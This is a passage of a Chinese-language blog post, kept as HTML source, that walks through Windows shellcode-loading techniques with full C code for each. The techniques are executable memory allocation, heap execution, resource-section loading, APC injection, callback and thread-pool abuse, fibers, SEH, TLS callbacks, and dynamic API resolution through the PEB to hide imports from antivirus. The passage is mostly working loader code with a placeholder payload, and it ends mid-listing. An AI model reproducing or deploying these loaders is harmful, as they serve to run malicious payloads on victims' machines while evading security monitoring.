class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)  </span><br><span class=\"line\">unsigned char buf[] &#x3D;&quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">void main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    LPVOID pMemory &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    RtlMoveMemory(pMemory, buf, sizeof(buf));</span><br><span class=\"line\">    HANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);</span><br><span class=\"line\">    WaitForSingleObject(hThread, INFINITE);</span><br><span class=\"line\">    VirtualFree(pMemory, 0, MEM_RELEASE);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"堆加载\"><a href=\"#堆加载\" class=\"headerlink\" title=\"堆加载\"></a>堆加载</h2><p>类似于动态申请内存，只不过申请的是堆空间</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)  </span><br><span class=\"line\">unsigned char buf[] &#x3D;&quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHANDLE heap &#x3D; HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(buf), 0);</span><br><span class=\"line\">\tLPVOID buffer &#x3D; HeapAlloc(heap, HEAP_ZERO_MEMORY,sizeof(buf));</span><br><span class=\"line\">\tRtlMoveMemory(buffer,buf,sizeof(buf));</span><br><span class=\"line\">\tHANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);</span><br><span class=\"line\">\tWaitForSingleObject(hThread, INFINITE);</span><br><span class=\"line\">\tHeapFree(heap, 0, buffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"资源节加载\"><a href=\"#资源节加载\" class=\"headerlink\" title=\"资源节加载\"></a>资源节加载</h2><p>资源文件通常存放在 <code>.rsrc</code> 节（Resource Section）中。<code>.rsrc</code> 节是 PE（Portable Executable）文件格式中的一个节（section），用于存储程序的资源信息，如图标、对话框、字符串、位图等。每个资源项都有一个唯一的标识符（ID），程序可以通过这个标识符来获取特定的资源。</p>\n<p>vs中 <strong>添加资源，导入bin文件，自定义资源类型</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &quot;resource.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;通过资源加载ShellCode</span><br><span class=\"line\">void ResourceLoader() &#123;</span><br><span class=\"line\">\t&#x2F;&#x2F;获取资源</span><br><span class=\"line\">    HRSRC Res &#x3D; FindResource(NULL, MAKEINTRESOURCE(IDR_SHELLCODE1), L&quot;shellcode&quot;);</span><br><span class=\"line\">    &#x2F;&#x2F;用于获取资源的大小</span><br><span class=\"line\">    DWORD ResSize &#x3D; SizeofResource(NULL, Res);</span><br><span class=\"line\">    &#x2F;&#x2F;LoadResource函数会将指定资源句柄所指向的资源数据加载到内存中，并返回一个指向该资源数据的句柄</span><br><span class=\"line\">    HGLOBAL Load &#x3D; LoadResource(NULL, Res);</span><br><span class=\"line\">    &#x2F;&#x2F;申请内存</span><br><span class=\"line\">    void* buffer &#x3D; VirtualAlloc(NULL, ResSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(buffer, Load, ResSize);</span><br><span class=\"line\">    &#x2F;&#x2F;执行shellcode</span><br><span class=\"line\">    ((void(*)(void)) buffer)();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    ResourceLoader();</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"APC注入\"><a href=\"#APC注入\" class=\"headerlink\" title=\"APC注入\"></a>APC注入</h2><p>异步过程调用（APC）队列是一个与线程关联的队列，用于存储要在该线程上下文中异步执行的函数。操作系统内核会跟踪每个线程的 APC 队列，并在适当的时机触发队列中挂起的函数。APC 队列通常用于实现线程间的异步通信、定时器回调以及异步 I/O 操作。</p>\n<p>触发流程：</p>\n<ul>\n<li>使用 <code>VirtualProtect</code> 函数修改 <code>shellcode</code> 所在内存区域的保护属性，将其设置为可执行、可读、可写</li>\n<li>获取 <code>NtTestAlert</code> 函数的地址。(这是一个内部函数，无法直接通过函数名调用，<code>NtTestAlert</code> 函数用于检查当前线程的 APC 队列，如果队列中有挂起的用户模式 APC 请求，<code>NtTestAlert</code> 将触发它们的执行)</li>\n<li>使用 <code>QueueUserAPC</code> 函数向当前线程的 APC 队列添加一个执行 Shellcode 的任务</li>\n<li>调用 <code>NtTestAlert</code> 函数，触发 APC 队列中的任务执行，实现 Shellcode 的执行</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef DWORD(WINAPI* pNtTestAlert)();</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 修改 shellcode 所在内存区域的保护属性，允许执行</span><br><span class=\"line\">    DWORD oldProtect;</span><br><span class=\"line\">    VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;获取NtTestAlert函数地址, 因为它是一个内部函数.无法直接通过函数名调用</span><br><span class=\"line\">    pNtTestAlert NtTestAlert &#x3D; (pNtTestAlert)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtTestAlert&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 将buf强转为APC 函数,向当前线程的异步过程调用(APC)队列添加一个执行shellcode的任务</span><br><span class=\"line\">    QueueUserAPC((PAPCFUNC)buf, GetCurrentThread(), NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;调用NtTestAlert，触发 APC 队列中的任务执行（即执行 shellcode）</span><br><span class=\"line\">    NtTestAlert();</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"基于回调函数\"><a href=\"#基于回调函数\" class=\"headerlink\" title=\"基于回调函数\"></a>基于回调函数</h2><p>通过 <strong>各种回调函数</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">EnumTimeFormatsA</span><br><span class=\"line\">EnumWindows</span><br><span class=\"line\">EnumDesktopWindows</span><br><span class=\"line\">EnumDateFormatsA</span><br><span class=\"line\">EnumChildWindows</span><br><span class=\"line\">EnumThreadWindows</span><br><span class=\"line\">EnumSystemLocalesA</span><br><span class=\"line\">EnumSystemGeoID</span><br><span class=\"line\">EnumSystemLanguageGroupsA</span><br><span class=\"line\">EnumUILanguagesA</span><br><span class=\"line\">EnumSystemCodePagesA</span><br><span class=\"line\">EnumDesktopsW</span><br><span class=\"line\">EnumSystemCodePagesW</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p><strong>EnumFontsW</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; 开辟空间</span><br><span class=\"line\">\tvoid *shellcode &#x3D; VirtualAlloc(NULL,sizeof(buf),MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\t&#x2F;&#x2F; copy shellcode</span><br><span class=\"line\">\tRtlMoveMemory(shellcode, buf, sizeof(buf));</span><br><span class=\"line\">\t&#x2F;&#x2F; 触发回调函数</span><br><span class=\"line\">\tEnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)shellcode, NULL);</span><br><span class=\"line\">\tEnumUILanguages((UILANGUAGE_ENUMPROCW)shellcode, 0, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"线程池等待\"><a href=\"#线程池等待\" class=\"headerlink\" title=\"线程池等待\"></a>线程池等待</h2><p>类似于回调函数，只不过是在线程池的应用中的几个函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    void* shellcode &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    RtlMoveMemory(shellcode, buf, sizeof(buf));</span><br><span class=\"line\">    &#x2F;*</span><br><span class=\"line\">    * CreateEvent是Windows API，用于创建一个事件对象</span><br><span class=\"line\">    * 参数1：安全属性，NULL表示默认</span><br><span class=\"line\">    * 参数2：是否手动复位</span><br><span class=\"line\">    * 参数3：TRUE表示事件对象的初始状态为有信号状态，否则为无信号状态</span><br><span class=\"line\">    * 参数4：事件名称，NULL表示不使用名称</span><br><span class=\"line\">    *&#x2F;</span><br><span class=\"line\">    HANDLE event &#x3D; CreateEvent(NULL, FALSE, TRUE, NULL);</span><br><span class=\"line\">    &#x2F;*</span><br><span class=\"line\">    * CreateThreadpoolWait是Windows API，用于创建一个线程池等待对象</span><br><span class=\"line\">    * 参数1：回调函数指针</span><br><span class=\"line\">    * 参数2：回调函数参数</span><br><span class=\"line\">    * 参数3：线程池回调环境</span><br><span class=\"line\">    *&#x2F;</span><br><span class=\"line\">    PTP_WAIT threadPoolWait &#x3D; CreateThreadpoolWait((PTP_WAIT_CALLBACK)(LPVOID)shellcode, NULL, NULL);</span><br><span class=\"line\">    &#x2F;*</span><br><span class=\"line\">    * SetThreadpoolWait是Windows API，用于向线程池中添加等待对象</span><br><span class=\"line\">    * 参数1：线程池等待对象</span><br><span class=\"line\">    * 参数2：要等待的内核对象句柄</span><br><span class=\"line\">    * 参数3：等待超时时间，NULL表示无限等待</span><br><span class=\"line\">    *&#x2F;</span><br><span class=\"line\">    SetThreadpoolWait(threadPoolWait, event, NULL);</span><br><span class=\"line\">    WaitForSingleObject(event, INFINITE); &#x2F;&#x2F; 等待事件对象执行完毕(状态变为无信号)，事件对象执行会执行回调函数buf</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"纤程加载\"><a href=\"#纤程加载\" class=\"headerlink\" title=\"纤程加载\"></a>纤程加载</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    DWORD oldProtect;</span><br><span class=\"line\">    VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 将当前线程转换为纤程（轻量级线程）</span><br><span class=\"line\">    ConvertThreadToFiber(NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 创建一个纤程对象，关联到shellcode作为纤程入口点，使用默认栈大小和无标志位</span><br><span class=\"line\">    void* shellcodeFiber &#x3D; CreateFiber(0, (LPFIBER_START_ROUTINE)(LPVOID)buf, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 切换到新创建的纤程，开始执行shellcode</span><br><span class=\"line\">    SwitchToFiber(shellcodeFiber);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; shellcode执行完毕后，删除纤程对象</span><br><span class=\"line\">    DeleteFiber(shellcodeFiber);</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"基于SEH异常处理\"><a href=\"#基于SEH异常处理\" class=\"headerlink\" title=\"基于SEH异常处理\"></a>基于SEH异常处理</h2><p>SEH（Structured Exception Handling，结构化异常处理）是 Windows 平台提供的一种异常处理机制，它允许程序员编写结构化的代码来处理异常情况。SEH 提供了一种在程序中捕获、处理和传播异常的方法，可以有效地处理诸如访问违例、除以零、内存访问错误等异常情况。</p>\n<p>SEH 提供了以下关键元素来实现异常处理：</p>\n<ol>\n<li>__try 块：用于包裹可能会引发异常的代码块。</li>\n<li>__except 块：用于捕获和处理异常的代码块。</li>\n<li>__finally 块（可选）：用于执行清理操作的代码块，在异常处理完毕后无论是否发生异常都会执行。</li>\n<li>__leave 语句（可选）：用于退出包裹在 __try 块中的代码。</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;)</span><br><span class=\"line\">&#x2F;&#x2F;#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;Windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)   &#x2F;&#x2F;不显示窗口 </span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\">int a &#x3D; 1;</span><br><span class=\"line\">int b &#x3D; 0;</span><br><span class=\"line\"></span><br><span class=\"line\">int exceptFilter()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tb &#x3D; 1; &#x2F;&#x2F; 修改b的值为1，以防止无限循环的异常处理</span><br><span class=\"line\">\t((void(*)(void)) &amp; buf)();</span><br><span class=\"line\">\treturn EXCEPTION_EXECUTE_HANDLER;</span><br><span class=\"line\">\t&#x2F;*</span><br><span class=\"line\">        异常处理函数的返回值除了有EXCEPTION_CONTINUE_EXECUTION,还有以下两个值:</span><br><span class=\"line\">        EXCEPTION_EXECUTE_HANDLER:常处理器已处理异常，程序应在_except块内继续执行</span><br><span class=\"line\">        EXCEPTION_CONTINUE_SEARCH:常处理器未处理异常，程序应继续搜索其他异常处理器</span><br><span class=\"line\">\t*&#x2F;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__try &#123;</span><br><span class=\"line\">\t\tint c &#x3D; a &#x2F; b;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t__except (exceptFilter()) &#123;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"TLS机制\"><a href=\"#TLS机制\" class=\"headerlink\" title=\"TLS机制\"></a>TLS机制</h2><p><a href=\"https://xz.aliyun.com/t/12057?time__1311=mqmhBKD50I=h7DlxGo/tNbMCFD8tYzeD&alichlgref=https://cn.bing.com/\">TLS回调函数的学习</a>、<a href=\"https://idiotc4t.com/code-and-dll-process-injection/tls-code-execute\">TLS Code Execute</a></p>\n<p>线程局部存储（TLS），是一种变量的存储方法，这个变量在它所在的线程内是全局可访问的，但是不能被其他线程访问到，这样就保持了数据的线程独立性。在启用了TLS功能的PE文件中，会设置有关于TLS的TLS Table（TLS表），这个表的位置信息可以在IMAGE_DATA_DIRECTORY DataDirectory[9]中找到。</p>\n<p> TLS的数据结构体如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">32位</span><br><span class=\"line\">typedef struct _IMAGE_TLS_DIRECTORY32 &#123;</span><br><span class=\"line\">    DWORD   StartAddressOfRawData;</span><br><span class=\"line\">    DWORD   EndAddressOfRawData;</span><br><span class=\"line\">    DWORD   AddressOfIndex;             &#x2F;&#x2F; PDWORD</span><br><span class=\"line\">    DWORD   AddressOfCallBacks;         &#x2F;&#x2F; PIMAGE_TLS_CALLBACK *</span><br><span class=\"line\">    DWORD   SizeOfZeroFill;</span><br><span class=\"line\">    union &#123;</span><br><span class=\"line\">        DWORD Characteristics;</span><br><span class=\"line\">        struct &#123;</span><br><span class=\"line\">            DWORD Reserved0 : 20;</span><br><span class=\"line\">            DWORD Alignment : 4;</span><br><span class=\"line\">            DWORD Reserved1 : 8;</span><br><span class=\"line\">        &#125; DUMMYSTRUCTNAME;</span><br><span class=\"line\">    &#125; DUMMYUNIONNAME;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; IMAGE_TLS_DIRECTORY32;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">64位</span><br><span class=\"line\">typedef struct _IMAGE_TLS_DIRECTORY64 &#123;</span><br><span class=\"line\">    ULONGLONG StartAddressOfRawData;</span><br><span class=\"line\">    ULONGLONG EndAddressOfRawData;</span><br><span class=\"line\">    ULONGLONG AddressOfIndex;         &#x2F;&#x2F; PDWORD</span><br><span class=\"line\">    ULONGLONG AddressOfCallBacks;     &#x2F;&#x2F; PIMAGE_TLS_CALLBACK *;</span><br><span class=\"line\">    DWORD SizeOfZeroFill;</span><br><span class=\"line\">    union &#123;</span><br><span class=\"line\">        DWORD Characteristics;</span><br><span class=\"line\">        struct &#123;</span><br><span class=\"line\">            DWORD Reserved0 : 20;</span><br><span class=\"line\">            DWORD Alignment : 4;</span><br><span class=\"line\">            DWORD Reserved1 : 8;</span><br><span class=\"line\">        &#125; DUMMYSTRUCTNAME;</span><br><span class=\"line\">    &#125; DUMMYUNIONNAME;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; IMAGE_TLS_DIRECTORY64;</span><br></pre></td></tr></table></figure>\n\n<p>其中 <strong>AddressOfCallBacks</strong> 这个成员是一个指向函数地址数组的指针，这里的函数的地址就是 <strong>TLS回调函数</strong> 的实际地址</p>\n<p>TLS回调函数：</p>\n<p>每当创建/终止线程时会自动调用执行的函数（<strong>创建进程的主线程时也会自动调用回调函数，且回调函数的执行顺序是 先于EP代码 的执行，即先于main函数，所以TLS回调函数的这个特性通常被用于反调试技术</strong>）由于是创建和终止线程时都会调用，所以在程序从打开到结束这个TLS回调函数会被执行两次。</p>\n<p>TLS函数模板如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">typedef VOID (NTAPI *PIMAGE_TLS_CALLBACK)</span><br><span class=\"line\">(</span><br><span class=\"line\">    PVOID DllHandle,</span><br><span class=\"line\">    DWORD Reason,</span><br><span class=\"line\">    PVOID Reserved</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n<p>32位与64位声明不同</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D;&quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;TLS回调函数</span><br><span class=\"line\">VOID NTAPI TlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tvoid* shellcode &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\t\tRtlMoveMemory(shellcode, buf, sizeof(buf));</span><br><span class=\"line\">\t\t((void(*)()) shellcode)();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;使用TLS需要在程序中新建一个.tls段专门存放TLS数据，申明使用</span><br><span class=\"line\">#ifdef _WIN64       &#x2F;&#x2F;64位</span><br><span class=\"line\">#pragma comment (linker, &quot;&#x2F;INCLUDE:_tls_used&quot;)  </span><br><span class=\"line\">#pragma comment (linker, &quot;&#x2F;INCLUDE:tls_callback_func&quot;) </span><br><span class=\"line\">#else               &#x2F;&#x2F;32位</span><br><span class=\"line\">#pragma comment (linker, &quot;&#x2F;INCLUDE:__tls_used&quot;) </span><br><span class=\"line\">#pragma comment (linker, &quot;&#x2F;INCLUDE:_tls_callback_func&quot;)</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;注册TLS回调函数</span><br><span class=\"line\">#ifdef _WIN64</span><br><span class=\"line\">#pragma const_seg(&quot;.CRT$XLF&quot;) &#x2F;&#x2F;64位</span><br><span class=\"line\">EXTERN_C const</span><br><span class=\"line\">#else</span><br><span class=\"line\">#pragma data_seg(&quot;.CRT$XLF&quot;) &#x2F;&#x2F;32位</span><br><span class=\"line\">EXTERN_C</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">PIMAGE_TLS_CALLBACK tls_callback_func[] &#x3D; &#123; TlsCallBack,0 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">#ifdef _WIN64    </span><br><span class=\"line\">#pragma const_seg() &#x2F;&#x2F;64位</span><br><span class=\"line\">#else</span><br><span class=\"line\">#pragma data_seg() &#x2F;&#x2F;32位</span><br><span class=\"line\">#endif </span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;After TLS&quot;);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>tips：TLS的特性可以加入反调试：<a href=\"https://www.cnblogs.com/helloylh/p/17209669.html\">TLS及反调试机制</a></p>\n<h2 id=\"动态API加载\"><a href=\"#动态API加载\" class=\"headerlink\" title=\"动态API加载\"></a>动态API加载</h2><p>一些敏感API函数或敏感API函数组合会被监控，同时在PE导入表也会列出敏感函数，通过动态加载：<strong>调用函数在PE导入表中不可见</strong></p>\n<p>主要通过两个函数实现：<strong>GetProcAddress</strong> 和 <strong>LoadLibraryA</strong></p>\n<p><strong>一些前置：</strong></p>\n<p>在RING3下 <strong>FS寄存器</strong> 指向 <strong>TEB(线程结构体)</strong> ，在TEB+0x30处就是 <strong>PEB进程结构体</strong>，PEB+0xC的位置就是 <strong>_PEB_LDR_DATA结构体</strong>，里面包含了dll加载链，该结构体中的 <strong>InInitializationOrderModuleList</strong> 这个链表 <strong>第二个必定是kernel32.dll</strong></p>\n<p><strong>流程思路：</strong></p>\n<ul>\n<li>定位关键模块：首先找到包含核心API函数的关键模块（如kernel32.dll）。这通常可以通过解析PEB（Process Environment Block）中的模块列表来完成。</li>\n<li>获取GetProcAddress：定位到kernel32.dll后，需要解析导出表（Export Table）以获取GetProcAddress函数的地址。GetProcAddress是一个核心函数，用于在运行时动态解析其他API函数的地址。</li>\n<li>加载其他API：<strong>通过GetProcAddress函数</strong>，可以逐个获取其他需要的API函数的地址。例如，可以通过GetProcAddress获取VirtualProtect、CreateThread和WaitForSingleObject等函数的地址。</li>\n<li>准备Shellcode：将Shellcode存储在缓冲区中，使用VirtualProtect函数将缓冲区的内存页属性更改为可执行，以确保可以安全地执行Shellcode。</li>\n<li>创建线程并执行Shellcode：使用CreateThread函数创建一个新线程，并将Shellcode的地址作为线程的启动例程。线程创建后，使用WaitForSingleObject等待线程执行完成</li>\n</ul>\n<p><strong>编写：</strong></p>\n<p><strong>x86</strong>，直接利用汇编获取kernel32.dll地址</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">__asm &#123;</span><br><span class=\"line\">\t\tpush eax</span><br><span class=\"line\">\t\tmov eax, fs:[0x30]</span><br><span class=\"line\">\t\tmov eax, [eax + 0xc]</span><br><span class=\"line\">\t\tmov eax, [eax + 0x1c]</span><br><span class=\"line\">\t\tmov eax, [eax]</span><br><span class=\"line\">\t\tmov eax, [eax + 0x8]</span><br><span class=\"line\">\t\tmov kernel32Address,eax</span><br><span class=\"line\">\t\tpop eax</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD GetKernel32Address()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDWORD kernel32Address &#x3D; 0;</span><br><span class=\"line\">\t__asm &#123;</span><br><span class=\"line\">\t\tpush eax</span><br><span class=\"line\">\t\tmov eax, fs:[0x30]</span><br><span class=\"line\">\t\tmov eax, [eax + 0xc]</span><br><span class=\"line\">\t\tmov eax, [eax + 0x1c]</span><br><span class=\"line\">\t\tmov eax, [eax]</span><br><span class=\"line\">\t\tmov eax, [eax + 0x8]</span><br><span class=\"line\">\t\tmov kernel32Address,eax</span><br><span class=\"line\">\t\tpop eax</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tprintf(&quot;[+]kernel32 base: 0x%p\\n&quot;, kernel32Address);</span><br><span class=\"line\">\treturn kernel32Address;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD RGetProcAddress(DWORD kernelbase)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; 获取Dos头即起始地址</span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)kernelbase;</span><br><span class=\"line\">\t&#x2F;&#x2F; 获取NT头</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + kernelbase);</span><br><span class=\"line\">\t&#x2F;&#x2F; 数据目录</span><br><span class=\"line\">\tPIMAGE_DATA_DIRECTORY pDataDir &#x3D; pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;</span><br><span class=\"line\">\t&#x2F;&#x2F; 导出表地址</span><br><span class=\"line\">\tPIMAGE_EXPORT_DIRECTORY pExport &#x3D; (PIMAGE_EXPORT_DIRECTORY)(pDataDir-&gt;VirtualAddress + kernelbase);</span><br><span class=\"line\">\tprintf(&quot;[+]Export Addr: 0x%p\\n&quot;, pExport);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;函数总数</span><br><span class=\"line\">\tDWORD dwFunCount &#x3D; pExport-&gt;NumberOfFunctions;</span><br><span class=\"line\">\t&#x2F;&#x2F;函数名称数量</span><br><span class=\"line\">\tDWORD dwFunNameCount &#x3D; pExport-&gt;NumberOfNames;</span><br><span class=\"line\">\t&#x2F;&#x2F;函数地址</span><br><span class=\"line\">\tPDWORD pAddrOfFun &#x3D; (PDWORD)(pExport-&gt;AddressOfFunctions + kernelbase);</span><br><span class=\"line\">\t&#x2F;&#x2F;函数名称地址</span><br><span class=\"line\">\tPDWORD pAddrOfNames &#x3D; (PDWORD)(pExport-&gt;AddressOfNames + kernelbase);</span><br><span class=\"line\">\t&#x2F;&#x2F;序号表</span><br><span class=\"line\">\tPWORD pAddrOfOrdinals &#x3D; (PWORD)(pExport-&gt;AddressOfNameOrdinals + kernelbase);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tfor (size_t i &#x3D; 0; i &lt; dwFunCount; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t&#x2F;&#x2F;判断函数地址是否存在,为空</span><br><span class=\"line\">\t\tif (!pAddrOfFun[i])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tcontinue;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t&#x2F;&#x2F;通过函数地址遍历函数名称地址，获取想要的函数</span><br><span class=\"line\">\t\tDWORD dwFunAddrOffset &#x3D; pAddrOfFun[i];</span><br><span class=\"line\">\t\tfor (size_t j &#x3D; 0; j &lt; dwFunNameCount; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tif (pAddrOfOrdinals[j] &#x3D;&#x3D; i)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tDWORD dwNameOffset &#x3D; pAddrOfNames[j];</span><br><span 